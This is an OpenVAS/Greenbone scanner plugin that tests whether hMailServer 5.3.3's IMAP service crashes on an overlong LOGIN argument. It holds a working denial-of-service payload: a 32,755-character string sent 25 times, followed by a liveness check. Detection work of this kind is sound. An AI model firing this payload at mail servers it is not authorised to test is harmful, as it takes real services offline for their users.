# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902929");
  script_version("2024-06-27T05:05:29+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-10-29 13:43:35 +0530 (Mon, 29 Oct 2012)");
  script_name("hMailServer IMAP Remote DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("imap4_banner.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/banner/available");

  script_xref(name:"URL", value:"http://1337day.com/exploit/19642");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22302/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117723/hmailserver-dos.txt");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2012/10/hmailserver-533-imap-remote-crash-poc.html");

  script_tag(name:"impact", value:"Successful exploitation will allow the attacker to cause denial of service.");

  script_tag(name:"affected", value:"hMailServer Version 5.3.3 Build 1879.");

  script_tag(name:"insight", value:"This flaw is due to an error within the IMAP server when handling
  a long argument to the 'LOGIN' command.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"hMailServer is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("imap_func.inc");
include("port_service_func.inc");

port = imap_get_port(default:143);
if("* OK IMAPrev1" >!< imap_get_banner(port:port))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

data = string("a LOGIN ", crap(length:32755, data:"A"),
              " AAAAAAAA\r\n", "a LOGOUT\r\n");

for(i = 0; i < 25; i++)
  send(socket:soc, data:data);

recv(socket:soc, length:4096);
close(soc);

sleep(5);

soc2 = open_sock_tcp(port);
if(soc2) {
  res = recv(socket:soc2, length:4096);
  close(soc2);
  if("* OK IMAPrev1" >!< res) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
} else {
  security_message(port:port);
  exit(0);
}
